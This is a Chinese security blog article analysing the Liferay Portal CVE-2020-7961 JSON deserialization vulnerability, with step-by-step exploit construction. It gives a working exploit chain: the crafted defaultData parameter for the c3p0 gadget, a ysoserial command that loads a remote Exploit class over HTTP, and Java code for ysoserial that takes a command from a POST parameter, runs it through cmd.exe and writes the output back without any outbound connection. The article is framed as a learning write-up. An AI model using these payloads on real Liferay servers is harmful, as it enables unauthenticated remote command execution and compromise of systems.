> 原文链接: https://www.anquanke.com//post/id/240042 


# liferay 反序列化漏洞分析及不出网回显构造


                                阅读量   
                                **133321**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01765becfbdc286e7d.jpg)](https://p3.ssl.qhimg.com/t01765becfbdc286e7d.jpg)



分析去年的CVE-2020-7961 liferay 反序列化漏洞，师傅们已经把漏洞点和利用方式总结的非常清楚了，但是对于我们这种java漏洞小白来说已有的分析并不能让我们构造出很好的不出网回显payload，本文主要围绕漏洞产生原因和不出网回显构造方法展开分析，给安全入门者弥补空白。



## 0x01 liferay介绍

Liferay（又称Liferay Portal）是一个开源门户项目，该项目包含了一个完整的J2EE应用，以创建Web站点、内部网，以此来向适当的客户群显示符合他们的文档和应用程序。它是一个出色的Java开源Portal产品，其中整合了很多当今流行的开源框架，也被不少人使用在实际项目中。

### <a class="reference-link" name="0x1%20%E6%BC%8F%E6%B4%9E%E8%8C%83%E5%9B%B4"></a>0x1 漏洞范围

Liferay Portal 6.1、6.2、7.0、7.1、7.2

liferay的6和7版本使用的json包不同前者使用Flexjson后者使用Joddjson

### <a class="reference-link" name="0x2%20%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"></a>0x2 漏洞介绍

本漏洞属于json反序列化漏洞，在到达认证逻辑之前已经触发漏洞逻辑，并在liferay代码中存在c3p0和CommonsBean jar包，因此可以通过ysoserial 工具构造反序列化内容，从而完成漏洞利用。



## 0x02 环境搭建

为了能够调试复现漏洞，在windows环境下搭建liferay环境，下载 [https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1](https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1) tomcat集成包，如下图所示：

[![](https://p0.ssl.qhimg.com/t0169895773c8c01576.png)](https://p0.ssl.qhimg.com/t0169895773c8c01576.png)

进入liferay tomcat的bin目录，修改catalina.bat 并执行startup.bat

```
SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8788
```

[![](https://p5.ssl.qhimg.com/t01c2c8b50f1f7eedc9.png)](https://p5.ssl.qhimg.com/t01c2c8b50f1f7eedc9.png)

liferay 执行起来后会自动打开浏览器并访问127.0.0.1的8000端口 ，并打开8788调试端口等待idea的链接

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01bd0804bfa62c4471.png)

**Intellij idea**配置Java远程调试端口和ip，并添加调试依赖库

[![](https://p1.ssl.qhimg.com/t013b0d436e108f0771.png)](https://p1.ssl.qhimg.com/t013b0d436e108f0771.png)



## 0x03 漏洞分析

漏洞分析这块，之前的师傅们已经写的很详细了，我也简单的这次漏洞要点梳理下。主要围绕以下几点展开

1.漏洞产生的具体过程<br>
2.漏洞产生的核心路由<br>
3.漏洞利用POST 参数构造方法

打算从挖洞的角度分析这个漏洞，看过很多关于这个漏洞的分析文章，从一开始的路由分析过来感觉不能理解漏洞发现的过程。

### <a class="reference-link" name="0x1%20%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E7%9A%84%E5%85%B7%E4%BD%93%E8%BF%87%E7%A8%8B"></a>0x1 漏洞产生的具体过程

从程序时序图上可以很清楚的看到高漏洞产生的位置，准确的说是在参数类型转换时触发的漏洞，在该操作之前liferay接受并处理了所有字符串参数。下面分析产生漏洞的两个关键点，参数解析和参数类型转换。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t018475c614117f3974.png)

**<a class="reference-link" name="1.%20%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90"></a>1. 参数解析**

函数调用栈如下

```
JSONWebServiceActionParameters._collectFromRequestParameters
JSONWebServiceActionParameters.collectAll
JSONWebServiceActionsManagerImpl.getJSONWebServiceAction
JSONWebServiceActionsManagerUtil.getJSONWebServiceAction
JSONWebServiceInvokerAction._executeStatement
JSONWebServiceInvokerAction.invoke
JSONWebServiceServiceAction.getJSON
JSONAction.execute
```

collectAll函数中的_collectFromRequestParameters函数起到了非常关键的作用，这部分代码是请求过来后对POST参数做解析处理，相关代码如下

[![](https://p0.ssl.qhimg.com/t01fbe27fd4546fd27d.png)](https://p0.ssl.qhimg.com/t01fbe27fd4546fd27d.png)

_collectFromRequestParameters中最关键的部分在于put函数的处理逻辑，在一开始的时候就匹配了 : 符号，并按照该符号分割得到key和typeName以及value

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01c0cf8ad098ee88d4.png)

经过处理后相关参数如下，代码的后续将这些内容填入了_parameterTypes和_innerParameters两个hashmap中以供后续使用

```
key="defaultData"
typeName="com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
value='`{`"userOverridesAsString":"HexAsciiSerializedMap:;"`}`'
```

分析到这里我们知道拥有控制typeName和value的能力，到底这些东西有什么用下面我们来揭晓。

**<a class="reference-link" name="2.%20%E5%8F%82%E6%95%B0%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"></a>2. 参数类型转换**

liferay得到了POST传递过来的字符串参数，需要将各个参数进行类型转化，转化成设置的格式。所以我们首先分析liferay是如何知道这些参数类型的。

在参数获取之后会获取对应的路由及参数类型，具体调用栈如下

```
JSONWebServiceActionParameters._getJSONWebServiceActionConfig
JSONWebServiceActionsManagerImpl.getJSONWebServiceAction
JSONWebServiceActionsManagerUtil.getJSONWebServiceAction
JSONWebServiceInvokerAction._executeStatement
JSONWebServiceInvokerAction.invoke
JSONWebServiceServiceAction.getJSON
JSONAction.execute
```

直接从_pathIndexedJSONServiceActionConfigs中获取path对应的处理类

[![](https://p1.ssl.qhimg.com/t01e1a6ed8b59e54ab9.png)](https://p1.ssl.qhimg.com/t01e1a6ed8b59e54ab9.png)

通过查找发现了两个匹配的路由

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t017f049c83f0a0f4c1.png)

接下来的操作就是从这两个路由中选择一个，通过观察发现这两个路由的参数个数不相同，第二个路由是四个参数比第一个多了个object类型的参数，_findJSONWebServiceAction的返回值就是已经选择好的路由和参数类型

[![](https://p1.ssl.qhimg.com/t0106b05a4a8f8569f3.png)](https://p1.ssl.qhimg.com/t0106b05a4a8f8569f3.png)

**<a class="reference-link" name="3.%20%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"></a>3. 漏洞点分析**

**<a class="reference-link" name="%EF%BC%881%EF%BC%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3"></a>（1）反序列化入口**

liferay 自己实现了JSON的反序列化逻辑，下面的函数looseDeserialize就是反序列化的入口，只需要传入字符串和Class类就可以按照类型进行反序列化。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0135655799d92280cf.png)

**<a class="reference-link" name="%EF%BC%882%EF%BC%89parameterType%E7%9A%84%E7%94%B1%E6%9D%A5"></a>（2）parameterType的由来**

在解析参数类型的时候获取了parameterTypeName字符串，之后通过ClassLoader的loadClass方法加载该类。

[![](https://p0.ssl.qhimg.com/t016015cebdefbbeb1d.png)](https://p0.ssl.qhimg.com/t016015cebdefbbeb1d.png)

这次发包参数为为 defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=xxx 那么解析出来的类就是com.mchange.v2.c3p0.WrapperConnectionPoolDataSource

**<a class="reference-link" name="%EF%BC%883%EF%BC%89json%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"></a>（3）json反序列化分析**

在一些非原生的反序列化的情况下，c3p0可以做到不出网利用。其原理是利用jodd json的反序列化时调用userOverridesAsString的setter，在setter中运行过程中会把传入的以HexAsciiSerializedMap开头的字符串进行解码并触发原生反序列化。

com.liferay.portal.json 最终调用的是 jodd.json.JsonParser方法

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01982bdd82277acc9c.png)

JsonParser在Json反序列化的时候首先调用参数的set方法，下面分析com.mchange.v2.c3p0.WrapperConnectionPoolDataSource 是怎么完成对象反序列化的。接着上面的函数下面是调用WrapperConnectionPoolDataSource的setuserOverridesAsString方法

[![](https://p0.ssl.qhimg.com/t01514eabcfb9ccf003.png)](https://p0.ssl.qhimg.com/t01514eabcfb9ccf003.png)

从parseUserOverridesAsString函数中可以看出通过搜索的方式将HexAsciiSAerializedMap的value提取出来并利用fromHexAscii函数将其解析为byte形式，交给SerializableUtils进行反序列化

[![](https://p2.ssl.qhimg.com/t01e99b96149f110c8b.png)](https://p2.ssl.qhimg.com/t01e99b96149f110c8b.png)

在代码的最后调用readObject方法解析反序列化

```
public static Object fromByteArray(byte[] var0) throws IOException, ClassNotFoundException `{`
    Object var1 = deserializeFromByteArray(var0);
    return var1 instanceof IndirectlySerialized ? ((IndirectlySerialized)var1).getObject() : var1;
`}`

public static Object deserializeFromByteArray(byte[] var0) throws IOException, ClassNotFoundException `{`
    ObjectInputStream var1 = new ObjectInputStream(new ByteArrayInputStream(var0));
    return var1.readObject();
`}`
```

### <a class="reference-link" name="0x2%20%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E7%9A%84%E6%A0%B8%E5%BF%83%E8%B7%AF%E7%94%B1"></a>0x2 漏洞产生的核心路由

对于漏洞分析的已经很详细了，那么我们怎么能够发包走到漏洞位置呢，这就涉及到路由问题，上面也分析过_executeStatement在JSONWebServiceInvokerAction类的invoke方法中有调用，向上追溯到JSONWebServiceServiceAction类

[![](https://p4.ssl.qhimg.com/t01dce586f6d51009b2.png)](https://p4.ssl.qhimg.com/t01dce586f6d51009b2.png)

在getJSONWebServiceAction函数中有Action选择的相关代码

[![](https://p1.ssl.qhimg.com/t01d6b3e3fb79ffb6d2.png)](https://p1.ssl.qhimg.com/t01d6b3e3fb79ffb6d2.png)

因此可以确定最后的路由为invoke即可，前面的一二级路由可以同过xml分析得到。

```
&lt;servlet-mapping&gt;
    &lt;servlet-name&gt;JSON Web Service Servlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/api/jsonws/*&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;
&lt;servlet&gt;
    &lt;servlet-name&gt;JSON Web Service Servlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;com.liferay.portal.jsonwebservice.JSONWebServiceServlet&lt;/servlet-class&gt;
    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    &lt;async-supported&gt;true&lt;/async-supported&gt;
&lt;/servlet&gt;

```

由xml文件可以确定访问的URL路径，后续是通过cmd参数进行动态路由调用所以需要分析都有那些动态路由，这里有两种分析

1.通过调试找到动态路由表

[![](https://p1.ssl.qhimg.com/t01608b94e08497f9ca.png)](https://p1.ssl.qhimg.com/t01608b94e08497f9ca.png)

2.通过查找官方文档确定

[![](https://p3.ssl.qhimg.com/t014d3c4f77d1ddf8c6.png)](https://p3.ssl.qhimg.com/t014d3c4f77d1ddf8c6.png)

### <a class="reference-link" name="0x3%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8POST%20%E5%8F%82%E6%95%B0%E6%9E%84%E9%80%A0"></a>0x3 漏洞利用POST 参数构造

**<a class="reference-link" name="1.%20POST%E5%8F%82%E6%95%B0%E4%B8%AA%E6%95%B0%E5%8F%8A%E5%90%8D%E7%A7%B0%E7%A1%AE%E5%AE%9A"></a>1. POST参数个数及名称确定**

在获取路由及参数类型后会对POST参数进行判断，主要逻辑是判断POST中是否包含了该路由的必要参数，以/expandocolumn/add-column为例，必要参数下图所示：

[![](https://p5.ssl.qhimg.com/t010df991c50494a87c.png)](https://p5.ssl.qhimg.com/t010df991c50494a87c.png)

判断逻辑如下，设置matched变量每当匹配到一个就将该变量+1，matched的个数必须需要的个数相同。

```
private int _countMatchedParameters(String[] parameterNames, MethodParameter[] methodParameters) `{`
        int matched = 0;
        MethodParameter[] var4 = methodParameters;
        int var5 = methodParameters.length;
        for(int var6 = 0; var6 &lt; var5; ++var6) `{`
            MethodParameter methodParameter = var4[var6];
            String methodParameterName = methodParameter.getName();
            methodParameterName = StringUtil.toLowerCase(methodParameterName);
            String[] var9 = parameterNames;
            int var10 = parameterNames.length;
            for(int var11 = 0; var11 &lt; var10; ++var11) `{`
                String parameterName = var9[var11];
                if (StringUtil.equalsIgnoreCase(parameterName, methodParameterName)) `{`
                    ++matched;
                `}`
            `}`
        `}`
        return matched;
    `}`
```

所以POST参数名称可以根据路由中参数确定

**<a class="reference-link" name="2.%20%E6%9E%84%E9%80%A0defaultData"></a>2. 构造defaultData**

根据前面的分析defaultData包含了json反序列的对象以及之后的利用链，首先清楚的是jodd序列化格式

```
`{`"userOverridesAsString":"HexAsciiSerializedMap:xxxx"`}`
```

给上述字符串指定个类型，在json反序列化的时候就会在指定的类中执行setuserOverridesAsString方法参数为后面的value

[![](https://p5.ssl.qhimg.com/t01df7174dd962349c8.png)](https://p5.ssl.qhimg.com/t01df7174dd962349c8.png)



## 0x04 payload编写

最后分析怎么编写payload，同时也是本篇文章分析的重点

### <a class="reference-link" name="0x1%20%E5%87%BA%E7%BD%91payload"></a>0x1 出网payload

<a class="reference-link" name="%EF%BC%881%EF%BC%89%E7%BC%96%E8%AF%91Java%E4%BB%A3%E7%A0%81"></a>**（1）编译Java代码**

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import javax.print.attribute.standard.PrinterMessageFromOperator;
public class Exploit`{`
    public Exploit() throws IOException,InterruptedException`{`
        String cmd="calc.exe";
        final Process process = Runtime.getRuntime().exec(cmd);
        printMessage(process.getInputStream());;
        printMessage(process.getErrorStream());
        int value=process.waitFor();
        System.out.println(value);
    `}`

    private static void printMessage(final InputStream input) `{`
        // TODO Auto-generated method stub
        new Thread (new Runnable() `{`
            @Override
            public void run() `{`
                // TODO Auto-generated method stub
                Reader reader =new InputStreamReader(input);
                BufferedReader bf = new BufferedReader(reader);
                String line = null;
                try `{`
                    while ((line=bf.readLine())!=null)
                    `{`
                        System.out.println(line);
                    `}`
                `}`catch (IOException  e)`{`
                    e.printStackTrace();
                `}`
            `}`
        `}`).start();
    `}`
`}`
```

命令行编译class文件

```
/Library/Java/JavaVirtualMachines/jdk1.8.0_112.jdk/Contents/Home/bin/javac Exploit.java
```

<a class="reference-link" name="%EF%BC%882%EF%BC%89%20%E7%94%9F%E6%88%90payload"></a>**（2） 生成payload**

ysoserial 生成c3p0 远程调用payload，将1.ser的十六进制字符串放到HexAsciiSerializedMap 后面

```
java -jar ysoserial.jar C3P0 "http://127.0.0.1:8089/:Exploit" &gt; 1.ser
```

<a class="reference-link" name="%EF%BC%883%EF%BC%89%20%E5%BC%80%E5%90%AFweb%E6%9C%8D%E5%8A%A1"></a>**（3） 开启web服务**

将编译好的Exploit.class 放在web目录下并开启服务

[![](https://p1.ssl.qhimg.com/t01c721b35a6a3e2696.png)](https://p1.ssl.qhimg.com/t01c721b35a6a3e2696.png)

### <a class="reference-link" name="0x2%20%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BEpayload"></a>0x2 不出网回显payload

将此方法详细的介绍下，在去年shiro反序列化漏洞出来的时候师傅们研究了各种中间件的不出网回显的利用方法。该方法的核心在于找到位于thread中的Request和Response ，从而可以在Request获取头部信息，在Response中写入回显结果。我们这次的回显对象是Liferay 因此就要在该代码中找到存储请求和相应对象的类方法。

<a class="reference-link" name="1.%20Request%E5%92%8CResponse"></a>**1. Request和Response**

我们可以通过liferay代码（JSONWebServiceServiceAction）分析得到其请求响应类ProtectedServletRequest 继承tomcat中的javax.servlet.http.HttpServletRequest，具体关系如下图所示：<br>**Request **

通过类关系图可以看出

[![](https://p3.ssl.qhimg.com/t0111531413181a36da.png)](https://p3.ssl.qhimg.com/t0111531413181a36da.png)

**Response**

[![](https://p1.ssl.qhimg.com/t01069156c05421ebf0.png)](https://p1.ssl.qhimg.com/t01069156c05421ebf0.png)

根据上面的关系图，我们就有了相应的目标，怎么从liferay中获取到ProtectedServletRequest对象呢？从下图中找到答案，AccessControlContext 定义了_httpServletRequest 和 _httpServletResponse属性以及getRequest和getResponse成员方法。

[![](https://p0.ssl.qhimg.com/t0157734c47dbaba0ee.png)](https://p0.ssl.qhimg.com/t0157734c47dbaba0ee.png)

因此我们可以采用以下方式获取目标的servlet 请求相应

```
httpServletResponse = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getResponse();
httpServletRequest = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getRequest();
```

**<a class="reference-link" name="2.%20%E8%B0%83%E8%AF%95payload%E7%9A%84%E6%96%B9%E6%B3%95"></a>2. 调试payload的方法**

编写这块回显代码的时候不可能盲写，也是需要一定的调试技巧的，我们首先吧程序断在触发漏洞的地方，之后通过Evaluate Expression 编写代码

[![](https://p2.ssl.qhimg.com/t018fdacd63b58d8558.png)](https://p2.ssl.qhimg.com/t018fdacd63b58d8558.png)

通过Evaluate后的代码只能是最后一个java语句的返回值如上图所示。最后利用这个方法写了个从POST参数获取命令，之后用回显的方式输出

```
javax.servlet.http.HttpServletResponse httpServletResponse;
javax.servlet.http.HttpServletRequest httpServletRequest;
httpServletResponse = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getResponse();
httpServletRequest = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getRequest();
java.io.Writer writer = httpServletResponse.getWriter();
String cmd = httpServletRequest.getParameter("4ct10n");
String[] cmds =  new String[]`{`"cmd.exe", "/c", cmd`}`;
java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
String output = s.hasNext() ? s.next() : "";
writer.write(output);
writer.flush();
```

正则表达式”\A”跟”^”的作用是一样的，代表文本的开头，useDelimiter(“\a”) 代表获取所有的输出内容

[![](https://p4.ssl.qhimg.com/t01635adf9bd5161860.png)](https://p4.ssl.qhimg.com/t01635adf9bd5161860.png)

**<a class="reference-link" name="3.%20%E4%B8%8Eysoserial%E6%95%B4%E5%90%88"></a>3. 与ysoserial整合**

在Evaluate 中写好回显代码之后要与ysoseial工具进行整合，从而生成相对应的利用链payload，

<a class="reference-link" name="%EF%BC%881%EF%BC%89%E5%9C%A8Gadgets.java%20%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81"></a>**（1）在Gadgets.java 中添加代码**

```
String cmd =
    "            javax.servlet.http.HttpServletResponse httpServletResponse;\n" +
    "            javax.servlet.http.HttpServletRequest httpServletRequest;\n" +
    "                httpServletResponse = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getResponse();\n" +
    "                httpServletRequest = com.liferay.portal.kernel.security.access.control.AccessControlUtil.getAccessControlContext().getRequest();\n" +
    "            java.io.Writer writer = httpServletResponse.getWriter();\n" +
    "                String cmd = httpServletRequest.getParameter("xxx");\n" +
    "                String[] cmds = new String[]`{`"cmd.exe", "/c", cmd`}`;\n" +
    "                java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
    "                java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\\\a");\n" +
    "                String output = s.hasNext() ? s.next() : "";\n"  +
    "            writer.write(output);\n" +
    "            writer.flush();\n";
```

利用上面的代码替换掉原来的cmd代码

[![](https://p3.ssl.qhimg.com/t01b9f53d78cd73a69a.png)](https://p3.ssl.qhimg.com/t01b9f53d78cd73a69a.png)

<a class="reference-link" name="%EF%BC%882%EF%BC%89%20%E6%B7%BB%E5%8A%A0%E4%BE%9D%E8%B5%96%E5%B9%B6%E7%BC%96%E8%AF%91"></a>**（2） 添加依赖并编译**

在使用ClassPool类将回显代码加入到反序列化链的时候，ysoserial会先将这段代码编译成字节码，因此在编译的过程中需要将portal-kernel.jar 添加到mvn的依赖包中，操作如下：

在ysoserial项目的pom.xml文件中添加com.liferay.portal.kernel

```
&lt;dependency&gt;
  &lt;groupId&gt;com.liferay.portal&lt;/groupId&gt;
  &lt;artifactId&gt;com.liferay.portal.kernel&lt;/artifactId&gt;
  &lt;version&gt;3.39.0&lt;/version&gt;
&lt;/dependency&gt;
```

[![](https://p3.ssl.qhimg.com/t01ba30c9851cbc03d4.png)](https://p3.ssl.qhimg.com/t01ba30c9851cbc03d4.png)

之后通过该指令生成反序列化paylaod ，将1.txt的二进制自负转换成十六进制之后再使用<br>
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 sss &gt; 1.txt

<a class="reference-link" name="4.%20%E5%8F%91%E9%80%81payload"></a>**4. 发送payload**

[![](https://p5.ssl.qhimg.com/t0142551e8a99acd5b9.png)](https://p5.ssl.qhimg.com/t0142551e8a99acd5b9.png)



## 总结

完整的学习去年liferay漏洞的触发和利用，特别是在反序列化回显利用方面学习到了很多，膜拜各位师傅们的操作，作为萌新的我只能慢慢理解其中的精髓，有机会分析关于JSON反序列化利用的相关知识以及关于反序列化回显的细节。



## 参考文章

[https://paper.seebug.org/1162/](https://paper.seebug.org/1162/)<br>[https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Liferay%20Portal%20CVE-2020-7961%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/](https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Liferay%20Portal%20CVE-2020-7961%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/)<br>[https://zhuanlan.zhihu.com/p/114625962](https://zhuanlan.zhihu.com/p/114625962)
